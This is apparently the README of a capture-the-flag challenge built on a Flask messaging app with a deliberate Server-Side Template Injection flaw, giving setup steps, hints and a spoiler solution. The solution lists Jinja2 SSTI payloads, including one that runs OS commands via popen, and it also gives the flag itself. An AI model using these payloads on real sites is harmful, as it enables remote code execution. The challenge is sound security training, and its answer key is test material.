# SSTI CTF Challenge

A Server-Side Template Injection (SSTI) challenge created with Flask and Jinja2 templates.

## Challenge Description

This challenge involves a simple messaging service that contains a Server-Side Template Injection vulnerability. Your goal is to exploit this vulnerability to retrieve the hidden flag.

## Deployment Instructions

### Using Docker Compose (Recommended)

1. Make sure you have Docker and Docker Compose installed.
2. Run the following command to build and start the container:

```
docker-compose up -d
```

3. Access the challenge at `http://localhost:5000`

### Manual Setup

1. Install the required Python packages:

```
pip install -r requirements.txt
```

2. Run the Flask application:

```
python app/app.py
```

3. Access the challenge at `http://localhost:5000`

## Challenge Hints

1. The messaging service doesn't properly sanitize the input.
2. Jinja2 templates can execute Python code under certain conditions.
3. The admin page contains the flag, but how can you access it without directly visiting the page?

## Solution

<details>
<summary>Click to reveal solution</summary>

This challenge involves a Server-Side Template Injection vulnerability.

1. Go to the "Leave a Message" page
2. In the name field, instead of entering a normal name, enter Jinja2 template code such as:

   - `{{7*7}}` - This should render as 49 if the SSTI vulnerability exists
   - `{{config}}` - To see the Flask configuration
   - `{{config.items()}}` - To see the configuration as key-value pairs
   - More advanced payloads can give you remote code execution:
   - `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
   - Or to directly get the flag: `{{request.application.__globals__.__builtins__.__import__('app').FLAG}}`

3. The flag is: `ETHACK{es_es_ti_ai_ahayahay}`
</details>
